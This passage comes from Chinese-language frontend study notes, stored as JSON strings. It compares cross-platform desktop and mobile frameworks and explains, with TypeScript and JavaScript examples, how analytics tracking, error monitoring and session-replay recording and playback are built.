插件，我们可以实现很多自动化的代码转换任务，提高开发效率，确保代码质量。在实际开发中，建议从简单的转换开始，逐步掌握更复杂的转换场景。","HvG6z8hz":"\n# 前言\n\n\n>  前端架构设计、设计模式\n\n","LFWdSGQh":"\n# 跨端（PC、移动端、小程序、Web 等）\n\n`#跨端` \n\n> 源于个人的某次分享\n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- PC 跨端\n\t- Electron \n\t- Tauri \n\t\t- 内置了原生的 Webview，所以包体积小\n\t- Qt\n\t- Flutter Desktop\n- 移动端\n\t- RN\n\t- Flutter\n\t\t- Flutter → H5\n\t\t\t- 用于容灾降级\n\t- 小程序\n- 卷两个方向\n\t- ==①== 性能体验\n\t- ==②== 研发效率&动态性\n\t- 小程序应该是==最佳平衡点==\n\n## 1. 端场景\n\n![图片&文件](./files/20241031-2.png)\n\n## 2. 当前市面上跨端技术\n\n![图片&文件](./files/20241031-3.png)\n\n## 3. PC 跨端\n\n### 3.1. 基于 Web 技术的跨端方案\n\n#### 3.1.1. Electron\n\n>  它的的性能上限是 `vscode`\n\n 最成熟和广泛使用的跨端框架\n \n- 优点：\n\t- 开发体验好，可直接使用 Web 技术栈\n\t- 生态系统成熟，大量现成解决方案\n\t- 跨平台支持完善\n- 缺点：\n\t- 应用体积较大\n\t- 内存占用高\n\t- 性能相对较差\n\n![图片&文件](./files/20241031-5.png)\n\n#### 3.1.2. Tauri\n\n- 新一代跨端框架\n- 优点：\n\t- 性能更好，内存占用更低\n\t- 应用体积小（通常比 **Electron 小 10-20 倍**）\n\t- 安全性更高，默认采用更严格的安全策略\n- 缺点：\n\t- 生态相对不够成熟\n\t- 学习曲线较陡（需要了解 Rust）\n\t- 某些特性的实现相对复杂\n\n#### 3.1.3. Tauri 为什么能够比 Electron 小这么多\n\n- Electron\n\t- 每个 Electron 应用都会打包**完整的 Chromium 引擎（约 150MB+）**\n\t- 包含完整的 Node.js 运行时\n\t\t- 比如 npm 依赖包 就很大啊\n\t- 所有依赖都需要打包进应用中\n- tauri\n\t- 使用**系统原生的 WebView**\n\t    - Windows：使用 Edge WebView2\n\t    - macOS：使用 WebKit\n\t    - Linux：使用 WebKitGTK\n\t- 核心使用 Rust 编写，体积小且高效\n\t- 不包含额外的运行时环境\n\t- 所以\n\t\t- 不需要打包 Chromium（节省约 150MB）\n\t\t- 不需要 Node.js 运行时（节省约 20MB）\n\t\t- 更高效的资源打包方式（节省约 5-10MB）\n\n### 3.2. 原生跨平台框架\n\n#### 3.2.1. Flutter Desktop\n\n- Google 推出的全平台框架\n- 特点：\n\t- 单一代码库支持所有平台\n\t- 高性能渲染引擎\n\t- 丰富的 UI 组件库\n\t- 热重载支持\n- 适用场景：\n\t- 需要高性能和一致 UI 体验的应用 \n\n#### 3.2.2. .NET MAUI\n\n- 微软的跨平台框架\n- 特点：\n\t- 支持 Windows、macOS\n\t- 与 .NET 生态深度集成\n\t- 原生性能\n\t- XAML 布局系统\n- 适用场景：企业级应用开发，特别是已有 `.NET` 技术栈的团队 \n\n### 3.3. 混合开发框架\n\n#### 3.3.1. Qt\n\n- 传统且强大的跨平台框架\n- 特点：\n\t- 高性能\n\t- 原生外观\n\t- 完善的工具链\n\t- 支持多种编程语言\n- 适用场景：对性能要求高的专业软件 \n\n### 3.4. 各框架对比\n\n#### 3.4.1. 性能对比\n\n```\n性能排名（从高到低）：\n1. Qt/原生应用\n2. Tauri\n3. Flutter Desktop\n4. Electron\n```\n\n#### 3.4.2. 开发效率对比\n\n```\n开发效率（从高到低）：\n1. Electron\n2. Flutter\n3. Tauri\n4. Qt\n```\n\n### 3.5. 应用场景选择\n\n- **Web 技术栈团队**：\n\t- 轻量级应用：选择 Tauri\n\t- 复杂应用：选择 Electron \n- **性能敏感场景**：\n\t- 专业软件：选择 Qt\n\t- 通用应用：选择 Tauri 或 Flutter\n- **.NET 技术栈**：\n\t- 企业应用：选择 .NET MAUI\n\t- 跨平台需求：考虑 Avalonia\n\n#### 3.5.1. 选择建议\n\n- **如果你是 Web 开发者**：\n\t- 小型应用推荐 Tauri\n\t- 大型应用或需要大量第三方库支持时推荐 `Electron`\n- **如果你需要最好的性能**：\n\t- 考虑 Qt 或 Tauri\n- **如果你需要漂亮的 UI 和良好的开发体验**：\n\t- 考虑 Flutter Desktop\n- **如果你是 .NET 开发者**：\n\t- 考虑 .NET MAUI 或 Avalonia\n\n## 4. 移动端跨端\n\n![图片&文件](./files/20241031-4.png)\n\n### 4.1. 贝壳的 Flutter 实践分享\n\n#### 4.1.1. 接入方案\n\n![图片&文件](./files/20241031-6.png)\n\n- 两个空间\n\t- flutter 空间\n\t- 原生空间\n\n#### 4.1.2. 开发模式：业务空间\n\n![图片&文件](./files/20241031-7.png)\n\n#### 4.1.3. 工程组织\n\n![图片&文件](./files/20241031-8.png)\n\n#### 4.1.4. 接入特点\n\n- 业务分离\n- 平台分离：\n\t- 只需要会 dart 和 flutter api\n- 支持热重载\n- 集成无感\n\n![图片&文件](./files/20241031-9.png)\n\n#### 4.1.5. Flutter H5 应用\n\n![图片&文件](./files/20241031-10.png)\n\n### 4.2. 小程序\n\n#### 4.2.1. 能做什么\n\n![图片&文件](./files/20241031-11.png)\n\n#### 4.2.2. 性价比最高 \n\n![图片&文件](./files/20241031-12.png)\n\n### 4.3. 小程序解决方案\n\n![图片&文件](./files/20241031-13.png)\n\n- taro \n- uni-app\n\n## 5. 跨端技术演进\n\n![图片&文件](./files/20241031-14.png)\n\n## 6. 演进平衡点：`性能体验`与`研发效率/动态性` 的平衡\n\n![图片&文件](./files/20241031-15.png)\n\n## 7. 前端能进入的场\n\n![图片&文件](./files/20241031-16.png)\n\n","qXVfj4kN":"\n# 前端数据采集的原理及实现\n\n`#前端埋点` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 数据采点的方式\n\t- ① 代码埋点\n\t\t- 适用场景：核心业务数据采集，重要转化节点跟踪\n\t- ② 可视化埋点\n\t\t- 通过==可视化工具==配置采集点\n\t- ③ 无埋点采集\n\t\t- 自动采集页面所有事件\n\t\t- 全量数据收集\n- 数据采集的基本原理\n\t- 核心采集类型\n\t\t- 基础信息\n\t\t\t- 页面URL\n\t\t\t- 页面标题\n\t\t\t- 时间戳\n\t\t\t- 浏览器信息\n\t\t- 用户行为\n\t\t\t- 行为类型\n\t\t\t- 操作目标\n\t\t\t- 相关数据\n\t\t- 性能数据\n\t\t\t- 加载时间\n\t\t\t- 首次绘制时间\n\t\t\t-  资源加载信息\n\t\t- 错误信息\n\t\t\t-  错误类型\n\t\t\t- 错误信息\n\t\t\t- 错误堆栈\n\t- 基本实现原理\n\t\t- Collector 数据采集器基==类==\n\t\t- 数据上报方法\n\t\t\t- Beacon API\n\t\t\t\t- navigator.sendBeacon\n\t\t\t- 图片上报\n\t- PV/UV 采集\n\t\t- 路由变化时触发（SPA应用）\n\t\t\t-  History 模式\n\t\t\t- Hash 模式\n\t- 用户行为采集\n\t\t- 获取元素路径\n\t- 性能数据采集\n\t\t- 首次绘制时间：first-paint\n\t\t- 首次内容绘制时间：first-contentful-pain\n\t\t- LCP采集：largest-contentful-paint\n\t\t- 资源加载情况：performance.getEntriesByType('resource')\n\t- 错误监控采集\n\t\t- window.error\n\t\t- window.addEventListener('error'\n\t\t- unhandledrejection\n- 数据上报策略\n\t- 根据错误级别\n\t\t- 有些需要立即上报\n\t\t- 或者队列，延迟上报\n- 数据处理与分析\n\t- 数据清洗\n\t\t-  移除敏感信息\n\t\t- 格式化数据\n\t- 注意脱敏处理，不采集==敏感信息==\n\t- 采集代码不应影响主业务性能\n\t- 设置合理的==采样率==\n- 采集方案选择\n\t-  **核心业务**采用**代码埋点**\n\t- 非核心行为使用==无埋点==\n\t- 灵活运用==可视化埋点==\n- 性能优化\n\t-  采用**批量**上报减少请求\n\t- 控制采集频率和数据量\n\t- 使用 `requestIdleCallback` 在空闲时处理\n- 监控告警\n\t- 设置**告警阈值**\n\t- 是否立即拉群等等\n- 安全合规\n\t- 数据脱敏\n\t- 权限控制\n\n\n---\n\n## 2. 数据采集的基本方式\n\n### 2.1. 代码埋点\n\n- **定义**：在代码中**特定位置**插入采集代码\n- **特点**：\n\t- 高度定制化\n\t- 精准控制\n\t- 需要开发人员手动添加\n- **适用场景**：\n\t- 核心业务数据采集，重要转化节点跟踪\n\n### 2.2. 可视化埋点\n\n- **原理**：\n\t- **通过可视化工具配置采集点**\n- **优势**：\n\t- 降低技术门槛\n\t- 运营人员可自主操作\n\t- 灵活配置\n\n### 2.3. 无埋点采集\n\n- **原理**：\n\t- 自动采集页面所有事件\n- **特点**：\n\t- 全量数据收集\n\t- 实现成本低\n\t- 数据量大\n\n## 3. 数据采集的基本原理\n\n### 3.1. 核心采集类型\n\n```typescript\ninterface CollectData {\n  // 基础信息\n  baseInfo: {\n    url: string;          // 页面URL\n    title: string;        // 页面标题\n    timestamp: number;    // 时间戳\n    userAgent: string;    // 浏览器信息\n  };\n  // 用户行为\n  behavior: {\n    type: string;        // 行为类型\n    target: string;      // 操作目标\n    data: any;           // 相关数据\n  };\n  // 性能数据\n  performance: {\n    loadTime: number;    // 加载时间\n    fpTime: number;      // 首次绘制时间\n    resources: any[];    // 资源加载信息\n  };\n  // 错误信息\n  error: {\n    type: string;        // 错误类型\n    message: string;     // 错误信息\n    stack?: string;      // 错误堆栈\n  };\n}\n```\n\n### 3.2. 基本实现原理\n\n```typescript\n// 数据采集器基类\nclass Collector {\n  private static instance: Collector;\n  private config: CollectorConfig;\n  \n  constructor(config: CollectorConfig) {\n    this.config = config;\n    this.init();\n  }\n\n  // 单例模式\n  public static getInstance(config: CollectorConfig): Collector {\n    if (!Collector.instance) {\n      Collector.instance = new Collector(config);\n    }\n    return Collector.instance;\n  }\n\n  private init(): void {\n    this.initPV();           // 页面访问\n    this.initClick();        // 点击事件\n    this.initError();        // 错误监控\n    this.initPerformance(); // 性能监控\n  }\n\n  // 数据上报方法\n  private report(data: any): void {\n    // 1. Beacon API\n    if (navigator.sendBeacon) {\n      navigator.sendBeacon(this.config.reportUrl, JSON.stringify(data));\n      return;\n    }\n\n    // 2. 图片上报\n    new Image().src = `${this.config.reportUrl}?data=${encodeURIComponent(JSON.stringify(data))}`;\n  }\n}\n```\n\n## 4. 具体实现方案\n\n### 4.1. PV/UV 采集\n\n```typescript hl:18,\nclass PVCollector {\n  private initPV(): void {\n    // 页面加载完成时触发\n    window.addEventListener('load', () => {\n      const pvData = {\n        url: location.href,\n        title: document.title,\n        timestamp: Date.now(),\n        referrer: document.referrer\n      };\n      \n      this.report({\n        type: 'PV',\n        data: pvData\n      });\n    });\n\n    // 路由变化时触发（SPA应用）\n    this.listenRouteChange();\n  }\n\n  private listenRouteChange(): void {\n    // History 模式\n    const originalPushState = history.pushState;\n    history.pushState = function() {\n      originalPushState.apply(this, arguments);\n      // 触发 PV 采集\n      this.collectPV();\n    };\n\n    // Hash 模式\n    window.addEventListener('hashchange', () => {\n      this.collectPV();\n    });\n  }\n}\n```\n\n### 4.2. 用户行为采集\n\n```typescript hl:25,9\nclass BehaviorCollector {\n  private initClick(): void {\n    // 点击事件代理\n    document.addEventListener('click', (event) => {\n      const target = event.target as HTMLElement;\n      \n      const behaviorData = {\n        type: 'click',\n        target: this.getElementPath(target),\n        timestamp: Date.now(),\n        data: {\n          innerText: target.innerText,\n          className: target.className,\n          id: target.id\n        }\n      };\n\n      this.report({\n        type: 'BEHAVIOR',\n        data: behaviorData\n      });\n    }, true);\n  }\n\n  // 获取元素路径\n  private getElementPath(element: HTMLElement): string {\n    const path: string[] = [];\n    let current = element;\n    \n    while (current && current !== document.body) {\n      const tag = current.tagName.toLowerCase();\n      const id = current.id ? `#${current.id}` : '';\n      const className = current.className ? \n        `.${current.className.split(' ').join('.')}` : '';\n      \n      path.unshift(`${tag}${id}${className}`);\n      current = current.parentElement as HTMLElement;\n    }\n    \n    return path.join(' > ');\n  }\n}\n```\n\n### 4.3. 性能数据采集\n\n```typescript\nclass PerformanceCollector {\n  private initPerformance(): void {\n    window.addEventListener('load', () => {\n      // 等待所有资源加载完成\n      setTimeout(() => {\n        const perfData = this.getPerformanceMetrics();\n        this.report({\n          type: 'PERFORMANCE',\n          data: perfData\n        });\n      }, 0);\n    });\n  }\n\n  private getPerformanceMetrics() {\n    const timing = performance.timing;\n    const paintMetrics = performance.getEntriesByType('paint');\n\n    return {\n      // 页面加载时间\n      loadTime: timing.loadEventEnd - timing.navigationStart,\n      // DOM 解析时间\n      domParseTime: timing.domComplete - timing.domLoading,\n      // 首次绘制时间\n      fpTime: paintMetrics.find(entry => entry.name === 'first-paint')?.startTime,\n      // 首次内容绘制时间\n      fcpTime: paintMetrics.find(entry => entry.name === 'first-contentful-paint')?.startTime,\n      // 资源加载情况\n      resources: performance.getEntriesByType('resource').map(entry => ({\n        name: entry.name,\n        duration: entry.duration,\n        size: entry.transferSize,\n        type: entry.initiatorType\n      }))\n    };\n  }\n}\n```\n\n```javascript\n// 核心性能指标采集\nconst observer = new PerformanceObserver((list) => {\n  const entries = list.getEntries();\n  entries.forEach(entry => {\n    if (entry.entryType === 'largest-contentful-paint') {\n      // LCP采集\n      collectPerformance('LCP', entry.startTime);\n    }\n    if (entry.entryType === 'layout-shift') {\n      // CLS采集\n      collectPerformance('CLS', entry.value);\n    }\n  });\n});\n\nobserver.observe({ entryTypes: ['largest-contentful-paint', 'layout-shift'] });\n```\n\n### 4.4. 错误监控采集\n\n```typescript hl:3,21,37\nclass ErrorCollector {\n  private initError(): void {\n    // JS 运行时错误\n    window.addEventListener('error', (event) => {\n      const errorData = {\n        type: 'ERROR',\n        subType: 'js',\n        message: event.message,\n        filename: event.filename,\n        position: `${event.lineno}:${event.colno}`,\n        stack: event.error?.stack,\n        timestamp: Date.now()\n      };\n\n      this.report({\n        type: 'ERROR',\n        data: errorData\n      });\n    }, true);\n\n    // Promise 未捕获错误\n    window.addEventListener('unhandledrejection', (event) => {\n      const errorData = {\n        type: 'ERROR',\n        subType: 'promise',\n        message: event.reason?.message || event.reason,\n        stack: event.reason?.stack,\n        timestamp: Date.now()\n      };\n\n      this.report({\n        type: 'ERROR',\n        data: errorData\n      });\n    });\n\n    // 资源加载错误\n    window.addEventListener('error', (event) => {\n      if (event.target && (event.target as HTMLElement).nodeName) {\n        const target = event.target as HTMLElement;\n        const errorData = {\n          type: 'ERROR',\n          subType: 'resource',\n          url: (target as any).src || (target as any).href,\n          tagName: target.nodeName,\n          timestamp: Date.now()\n        };\n\n        this.report({\n          type: 'ERROR',\n          data: errorData\n        });\n      }\n    }, true);\n  }\n}\n```\n\n## 5. 数据上报策略\n\n### 5.1. 上报方法实现\n\n- 根据错误级别，有些需要立即上报\n- 或者队列，延迟上报\n\n```typescript\nclass Reporter {\n  private queue: any[] = [];\n  private timer: number | null = null;\n  \n  constructor(private config: ReporterConfig) {\n    this.init();\n  }\n\n  private init(): void {\n    // 页面卸载前发送\n    window.addEventListener('beforeunload', () => {\n      this.flush();\n    });\n  }\n\n  // 添加到队列\n  public add(data: any): void {\n    this.queue.push({\n      ...data,\n      timestamp: Date.now()\n    });\n\n    // 达到阈值立即发送\n    if (this.queue.length >= this.config.maxCache) {\n      this.flush();\n      return;\n    }\n\n    // 定时发送\n    if (!this.timer) {\n      this.timer = window.setTimeout(() => {\n        this.flush();\n      }, this.config.delay);\n    }\n  }\n\n  // 立即发送\n  private flush(): void {\n    if (this.queue.length === 0) return;\n\n    // 优先使用 Beacon API\n    if (navigator.sendBeacon) {\n      navigator.sendBeacon(\n        this.config.reportUrl,\n        JSON.stringify(this.queue)\n      );\n    } else {\n      // 降级方案：图片上报\n      const data = encodeURIComponent(JSON.stringify(this.queue));\n      new Image().src = `${this.config.reportUrl}?data=${data}`;\n    }\n\n    // 清空队列\n    this.queue = [];\n    if (this.timer) {\n      clearTimeout(this.timer);\n      this.timer = null;\n    }\n  }\n}\n```\n\n### 5.2. 使用示例\n\n```typescript\n// 配置初始化\nconst collector = Collector.getInstance({\n  reportUrl: 'https://analytics-api.example.com/collect',\n  delay: 1000,          // 延迟发送\n  maxCache: 10,         // 最大缓存数\n  sampling: 100,        // 采样率\n  ignoreUrls: [        // 忽略的URL\n    /localhost/,\n    /127.0.0.1/\n  ]\n});\n\n// 手动上报\ncollector.report({\n  type: 'CUSTOM',\n  data: {\n    event: 'button_click',\n    buttonId: 'submit-btn'\n  }\n});\n```\n\n## 6. 数据处理与分析\n\n### 6.1. 数据清洗\n\n - 移除敏感信息\n - 格式化数据\n - 补充必要信息\n\n```typescript\ninterface CleanedData {\n  timestamp: number;\n  sessionId: string;\n  userId: string;\n  eventType: string;\n  eventData: any;\n}\n\nclass DataProcessor {\n  static clean(rawData: any[]): CleanedData[] {\n    return rawData.map(item => ({\n      timestamp: item.timestamp,\n      sessionId: this.getSessionId(),\n      userId: this.getUserId(),\n      eventType: item.type,\n      eventData: this.normalizeData(item.data)\n    }));\n  }\n\n  private static normalizeData(data: any): any {\n    // 数据标准化处理\n    return {\n      ...data,\n      // 移除敏感信息\n      // 格式化数据\n      // 补充必要信息\n    };\n  }\n}\n```\n\n通过以上实现，我们可以构建一个完整的前端数据采集系统。需要注意以下几点：\n\n1. **性能影响**：采集代码不应影响主业务性能\n2. **数据安全**：注意脱敏处理，不采集==敏感信息==\n3. **采样控制**：根据业务需求设置合理的采样率\n4. **容错处理**：保证采集代码的健壮性\n5. **合规性**：遵守数据保护相关法规\n\n## 7. 最佳实践建议\n\n### 7.1. 采集策略\n\n- **核心业务**采用**代码埋点**\n- 非核心行为使用==无埋点==\n- 灵活运用可视化埋点\n\n### 7.2. 性能优化\n\n- 采用**批量**上报减少请求\n- 使用 `requestIdleCallback` 在空闲时处理\n- 控制采集频率和数据量\n\n### 7.3. 数据处理\n\n- 建立数据清洗机制\n- 实现实时分析能力\n- 设置**告警阈值**\n\n### 7.4. 监控维度\n\n- 页面性能指标\n- 用户行为数据\n- 错误日志\n- 业务指标\n- 资源加载情况\n\n## 8. 数据安全考虑\n\n### 8.1. 数据脱敏\n\n```javascript\nfunction maskSensitiveData(data) {\n  // 手机号脱敏\n  if (data.phone) {\n    data.phone = data.phone.replace(/(\\d{3})\\d{4}(\\d{4})/, '$1****$2');\n  }\n  \n  // 邮箱脱敏\n  if (data.email) {\n    data.email = data.email.replace(/(.{3}).+(@.+)/, '$1***$2');\n  }\n  \n  return data;\n}\n```\n\n### 8.2. 权限控制\n\n```javascript\nclass DataCollector {\n  constructor() {\n    this.allowedDomains = ['example.com', 'sub.example.com'];\n  }\n\n  checkPermission() {\n    const currentDomain = window.location.hostname;\n    return this.allowedDomains.some(domain => \n      currentDomain === domain || currentDomain.endsWith(`.${domain}`)\n    );\n  }\n\n  collect(data) {\n    if (!this.checkPermission()) {\n      console.warn('Unauthorized data collection attempt');\n      return;\n    }\n    // 继续数据采集\n  }\n}\n```\n\n","T07EAnXU":"\n# 时光机（录制与回放）的技术原理\n\n`#前端埋点` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 记录用户在页面上的==所有行为和页面状态变化==\n\t- 快照 + 增量\n\t\t- 记录==页面初始状态==和==后续变化==\n\t- 操作行为序列化\n\t\t- 记录用户的所有交互行为\n\t- 时间轴\n\t\t- 按时间顺序存储所有事件\n\t- 回放：\n\t\t- 回放时**重建DOM树** 和 **用户操作**\n- 关键点\n\t- ① DOM 变更记录：MutationObserver API\n\t- ② 用户交互记录：==监听所有的事件，并记录下来==\n\t\t- 鼠标事件\n\t\t- 键盘事件\n\t\t- 表单事件\n\t\t- 滚动事件\n\t- ③ 页面状态记录：视口变化、历史记录等等\n\t\t- resize\n\t\t- popstate\n\t- ④ 回放功能\n\t\t- 回放控制器&播放器\n\t\t- 重建\n- 特殊情况\n\t-  iframe处理\n\t- 异步资源加载\n\t\t- 处理动态加载的资源，监听资源加载\n\t\t\t- 使用 `new PerformanceObserver`\n- 安全性考虑\n\t- 敏感信息过滤\n\t- 密码输入框处理\n\t- 优化产品体验\n- 性能优化\n\t- 数据压缩与存储\n\t\t- 使用 IndexedDB 存储记录\n\t- 批量处理\n\t- 使用 `Web Workers` 处理数据压缩和解压\n\t- 实现增量更新机制\n\t- 使用 `RequestAnimationFrame` 控制动画\n\t- ==及时释放==不需要的资源\n\t\t- 定期清理不需要的记录\n\n## 1. 基本原理\n\n时光机（Session Replay）的核心是**记录用户在页面上的所有行为和页面状态变化**\n\n- **快照 + 增量快照**：\n\t- 记录页面初始状态和后续变化\n- **操作指令序列化**：\n\t- 记录用户的所有交互行为\n- **时间轴管理**：\n\t- 按时间顺序存储所有事件\n- **状态重建**：\n\t- 在回放时**重建DOM树** 和 **用户操作**\n\n## 2. 录制功能实现\n\n### 2.1. DOM 变更记录： `MutationObserver API`\n\n```javascript hl:10,3\nclass DOMRecorder {\n  constructor() {\n    this.records = [];\n    this.startTime = Date.now();\n    this.initObservers();\n  }\n\n  initObservers() {\n    // 监听 DOM 变化\n    this.mutationObserver = new MutationObserver(mutations => {\n      mutations.forEach(mutation => this.handleMutation(mutation));\n    });\n\n    // 配置观察选项\n    const config = {\n      attributes: true,        // 监听属性变化\n      childList: true,        // 监听子节点增删\n      subtree: true,          // 监听所有后代节点\n      characterData: true,    // 监听文本内容变化\n      attributeOldValue: true // 记录属性旧值\n    };\n\n    // 开始观察\n    this.mutationObserver.observe(document.documentElement, config);\n  }\n\n  handleMutation(mutation) {\n    const record = {\n      type: 'mutation',\n      timestamp: Date.now() - this.startTime,\n      target: this.getNodePath(mutation.target),\n      mutationType: mutation.type\n    };\n\n    switch (mutation.type) {\n      case 'attributes':\n        record.attributeName = mutation.attributeName;\n        record.oldValue = mutation.oldValue;\n        record.newValue = mutation.target.getAttribute(mutation.attributeName);\n        break;\n      \n      case 'characterData':\n        record.oldValue = mutation.oldValue;\n        record.newValue = mutation.target.textContent;\n        break;\n      \n      case 'childList':\n        record.addedNodes = Array.from(mutation.addedNodes).map(node => \n          this.serializeNode(node)\n        );\n        record.removedNodes = Array.from(mutation.removedNodes).map(node => \n          this.serializeNode(node)\n        );\n        break;\n    }\n\n    this.records.push(record);\n  }\n\n  // 获取节点的唯一路径\n  getNodePath(node) {\n    const path = [];\n    let current = node;\n\n    while (current && current !== document.documentElement) {\n      const parent = current.parentNode;\n      if (!parent) break;\n\n      const children = Array.from(parent.children);\n      const index = children.indexOf(current);\n      path.unshift(index);\n      current = parent;\n    }\n\n    return path;\n  }\n}\n```\n\n### 2.2. 用户交互记录：监听所有的事件，并记录下来\n\n数据结构示例：\n\n```javascript\nconst record = {\n      type: 'mouse',\n      eventType: event.type,\n      timestamp: Date.now() - this.startTime,\n      x: event.clientX,\n      y: event.clientY,\n      target: this.getNodePath(event.target)\n    };\n```\n\n代码部分：\n\n```javascript\nclass InteractionRecorder {\n  constructor() {\n    this.records = [];\n    this.startTime = Date.now();\n    this.initEventListeners();\n  }\n\n  initEventListeners() {\n    // 鼠标事件\n    const mouseEvents = ['click', 'mousedown', 'mouseup', 'mousemove'];\n    mouseEvents.forEach(eventType => {\n      document.addEventListener(eventType, this.handleMouseEvent.bind(this), true);\n    });\n\n    // 键盘事件\n    const keyboardEvents = ['keydown', 'keyup'];\n    keyboardEvents.forEach(eventType => {\n      document.addEventListener(eventType, this.handleKeyboardEvent.bind(this), true);\n    });\n\n    // 表单事件\n    const formEvents = ['input', 'change', 'focus', 'blur'];\n    formEvents.forEach(eventType => {\n      document.addEventListener(eventType, this.handleFormEvent.bind(this), true);\n    });\n\n    // 滚动事件\n    window.addEventListener('scroll', \n      this.throttle(this.handleScroll.bind(this), 100), \n      true\n    );\n  }\n\n  handleMouseEvent(event) {\n    const record = {\n      type: 'mouse',\n      eventType: event.type,\n      timestamp: Date.now() - this.startTime,\n      x: event.clientX,\n      y: event.clientY,\n      target: this.getNodePath(event.target)\n    };\n\n    if (event.type === 'click') {\n      record.button = event.button;\n    }\n\n    this.records.push(record);\n  }\n\n  handleFormEvent(event) {\n    const record = {\n      type: 'form',\n      eventType: event.type,\n      timestamp: Date.now() - this.startTime,\n      target: this.getNodePath(event.target)\n    };\n\n    if (event.type === 'input' || event.type === 'change') {\n      record.value = event.target.value;\n      if (event.target.type === 'checkbox' || event.target.type === 'radio') {\n        record.checked = event.target.checked;\n      }\n    }\n\n    this.records.push(record);\n  }\n\n  // 节流函数\n  throttle(func, limit) {\n    let inThrottle;\n    return function(...args) {\n      if (!inThrottle) {\n        func.apply(this, args);\n        inThrottle = true;\n        setTimeout(() => inThrottle = false, limit);\n      }\n    }\n  }\n}\n```\n\n### 2.3. 页面状态记录：视口变化、历史记录等等\n\n```javascript\nclass StateRecorder {\n  constructor() {\n    this.records = [];\n    this.startTime = Date.now();\n    this.initStateTracking();\n  }\n\n  initStateTracking() {\n    // 记录初始状态\n    this.recordInitialState();\n\n    // 监听视口变化\n    window.addEventListener('resize', \n      this.throttle(this.handleResize.bind(this), 100)\n    );\n\n    // 监听历史记录变化\n    window.addEventListener('popstate', \n      this.handleHistoryChange.bind(this)\n    );\n  }\n\n  recordInitialState() {\n    const record = {\n      type: 'initial_state',\n      timestamp: 0,\n      viewport: {\n        width: window.innerWidth,\n        height: window.innerHeight\n      },\n      scroll: {\n        x: window.pageXOffset,\n        y: window.pageYOffset\n      },\n      url: window.location.href\n    };\n\n    this.records.push(record);\n  }\n\n  handleResize() {\n    const record = {\n      type: 'viewport',\n      timestamp: Date.now() - this.startTime,\n      width: window.innerWidth,\n      height: window.innerHeight\n    };\n\n    this.records.push(record);\n  }\n}\n```\n\n## 3. 回放功能实现\n\n### 3.1. 回放控制器\n\n```javascript\nclass ReplayController {\n  constructor(records) {\n    this.records = this.preprocessRecords(records);\n    this.currentTime = 0;\n    this.speed = 1;\n    this.isPlaying = false;\n    this.initReplayEnvironment();\n  }\n\n  preprocessRecords(records) {\n    // 按时间戳排序\n    return records.sort((a, b) => a.timestamp - b.timestamp);\n  }\n\n  initReplayEnvironment() {\n    // 创建回放容器\n    this.container = document.createElement('div');\n    this.container.className = 'replay-container';\n    document.body.appendChild(this.container);\n\n    // 创建虚拟DOM\n    this.virtualDOM = document.createElement('iframe');\n    this.container.appendChild(this.virtualDOM);\n\n    // 初始化控制器\n    this.createControls();\n  }\n\n  play() {\n    if (this.isPlaying) return;\n    this.isPlaying = true;\n    this.startTime = Date.now() - this.currentTime;\n    this.playLoop();\n  }\n\n  pause() {\n    this.isPlaying = false;\n  }\n\n  playLoop() {\n    if (!this.isPlaying) return;\n\n    const currentTime = (Date.now() - this.startTime) * this.speed;\n    const pendingRecords = this.records.filter(record => \n      record.timestamp > this.currentTime && \n      record.timestamp <= currentTime\n    );\n\n    pendingRecords.forEach(record => {\n      this.applyRecord(record);\n    });\n\n    this.currentTime = currentTime;\n\n    if (this.currentTime < this.records[this.records.length - 1].timestamp) {\n      requestAnimationFrame(() => this.playLoop());\n    } else {\n      this.isPlaying = false;\n    }\n  }\n}\n```\n\n### 3.2. 记录应用器\n\n```javascript\nclass RecordApplier {\n  constructor(virtualDOM) {\n    this.virtualDOM = virtualDOM;\n  }\n\n  applyRecord(record) {\n    switch (record.type) {\n      case 'mutation':\n        this.applyMutation(record);\n        break;\n      case 'mouse':\n        this.applyMouseEvent(record);\n        break;\n      case 'form':\n        this.applyFormEvent(record);\n        break;\n      case 'viewport':\n        this.applyViewportChange(record);\n        break;\n    }\n  }\n\n  applyMutation(record) {\n    const target = this.getNodeByPath(record.target);\n    if (!target) return;\n\n    switch (record.mutationType) {\n      case 'attributes':\n        if (record.newValue === null) {\n          target.removeAttribute(record.attributeName);\n        } else {\n          target.setAttribute(record.attributeName, record.newValue);\n        }\n        break;\n\n      case 'characterData':\n        target.textContent = record.newValue;\n        break;\n\n      case 'childList':\n        // 处理移除的节点\n        record.removedNodes.forEach(nodeData => {\n          const node = this.getNodeByPath(nodeData.path);\n          if (node) node.remove();\n        });\n\n        // 处理添加的节点\n        record.addedNodes.forEach(nodeData => {\n          const node = this.deserializeNode(nodeData);\n          const parent = this.getNodeByPath(record.target);\n          if (parent) parent.appendChild(node);\n        });\n        break;\n    }\n  }\n\n  // 根据路径获取节点\n  getNodeByPath(path) {\n    let node = this.virtualDOM.contentDocument.documentElement;\n    for (const index of path) {\n      node = node.children[index];\n      if (!node) return null;\n    }\n    return node;\n  }\n}\n```\n\n### 3.3. 鼠标轨迹重现：事件重放\n\n```javascript\nclass MouseTracker {\n  constructor(container) {\n    this.container = container;\n    this.cursor = this.createCursor();\n  }\n\n  createCursor() {\n    const cursor = document.createElement('div');\n    cursor.className = 'replay-cursor';\n    cursor.style.cssText = `\n      position: absolute;\n      width: 20px;\n      height: 20px;\n      background: rgba(255, 0, 0, 0.5);\n      border-radius: 50%;\n      pointer-events: none;\n      transform: translate(-50%, -50%);\n      z-index: 9999;\n    `;\n    this.container.appendChild(cursor);\n    return cursor;\n  }\n\n  moveCursor(x, y) {\n    this.cursor.style.left = `${x}px`;\n    this.cursor.style.top = `${y}px`;\n  }\n\n  showClick() {\n    const click = document.createElement('div');\n    click.className = 'replay-click';\n    click.style.cssText = `\n      position: absolute;\n      left: ${this.cursor.style.left};\n      top: ${this.cursor.style.top};\n      width: 20px;\n      height: 20px;\n      border: 2px solid red;\n      border-radius: 50%;\n      animation: click-animation 0.5s ease-out;\n      pointer-events: none;\n    `;\n    this.container.appendChild(click);\n    setTimeout(() => click.remove(), 500);\n  }\n}\n```\n\n## 4. 性能优化\n\n### 4.1. 数据压缩与存储\n\n```javascript\nclass RecordCompressor {\n  compress(records) {\n    // 使用相对时间戳\n    let lastTimestamp = 0;\n    return records.map(record => {\n      const compressed = {...record};\n      \n      // 转换为相对时间戳\n      compressed.timestamp = record.timestamp - 